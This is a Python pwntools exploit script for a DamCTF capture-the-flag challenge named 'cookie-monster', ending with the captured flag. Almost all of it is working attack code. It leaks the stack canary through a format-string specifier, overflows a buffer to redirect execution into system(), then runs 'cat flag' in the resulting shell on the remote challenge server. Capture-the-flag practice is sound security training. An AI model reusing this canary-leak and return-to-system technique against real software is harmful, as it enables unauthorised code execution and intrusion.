#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template cookie-monster
from pwn import ELF, remote, process, u32, p32, FmtStr, args, gdb, context, pause, fmtstr_payload, log

# Set up pwntools for the correct architecture
exe = context.binary = ELF('cookie-monster')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

HOST, PORT = "chals.damctf.xyz", 31312


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote(HOST, PORT)
    p = process([exe.path] + argv, *a, **kw)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
    
    return p

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b bakery
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

io = start()

io.recvuntil(b"name: ")
payload = b""
payload += b"%15$p"

io.sendline(payload)
io.recvuntil(b"Hello ", drop=True)
canary_leak = io.recvline().strip()
canary = int(canary_leak, 0)
log.success(f"Got canary: {hex(canary)}")
res = io.recvuntil(b"purchase?")

call_system = 0x8048605
buffer = next(exe.search(b"/bin/sh")) 

payload = b"cat cookies.txt\x00".ljust(0x20, b"\x00")
payload += p32(canary)
payload += p32(0xdeadbeef)
payload += p32(buffer + 0x1846)
payload += p32(0xcafebabe)
payload += p32(call_system)

io.sendline(payload)

io.recvline()
io.recvline()
io.sendline(b"cat flag")
res = io.recvline().strip()
log.success(f"Got flag: {res}")

# dam{s74CK_c00k13S_4r3_d3L1C10Us}
